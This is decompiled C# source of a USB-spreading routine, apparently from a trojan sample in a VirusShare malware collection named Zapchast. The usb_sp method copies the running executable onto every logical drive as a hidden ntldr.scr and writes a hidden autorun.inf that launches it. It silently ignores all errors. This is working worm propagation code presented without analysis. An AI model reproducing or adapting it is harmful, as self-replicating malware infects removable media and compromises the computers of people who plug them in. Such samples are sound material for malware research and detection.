// Decompiled with JetBrains decompiler
// Type: zub.Spread
// Assembly: zub, Version=1.0.1.5, Culture=neutral, PublicKeyToken=null
// MVID: 48A5438B-11FD-4EEE-88C7-AA931AE92F31
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.Zapchast.aaxrn-15afce431f9064b1d75b7e7f83f2d7ad5b9e68621f44a39c75ffd88172493695.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Windows.Forms;
using zub.My;

namespace zub
{
  [StandardModule]
  internal sealed class Spread
  {
    public static void usb_sp()
    {
      try
      {
        string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          try
          {
            if (File.Exists(str + "\\autorun.inf"))
              File.Delete(str + "\\autorun.inf");
            if (File.Exists(str + "ntldr.scr"))
              File.Delete(str + "ntldr.scr");
            File.Copy(Application.ExecutablePath, str + "ntldr.scr");
            StreamWriter streamWriter = new StreamWriter(str + "\\autorun.inf");
            streamWriter.WriteLine("[autorun]");
            streamWriter.WriteLine("open=" + str + "ntldr.scr");
            streamWriter.WriteLine("shellexecute=" + str, (object) 1);
            streamWriter.Close();
            File.SetAttributes(str + "autorun.inf", FileAttributes.Hidden);
            File.SetAttributes(str + "ntldr.scr", FileAttributes.Hidden);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
        int num = (int) Interaction.MsgBox((object) "TEST: Spread USB Drive!");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
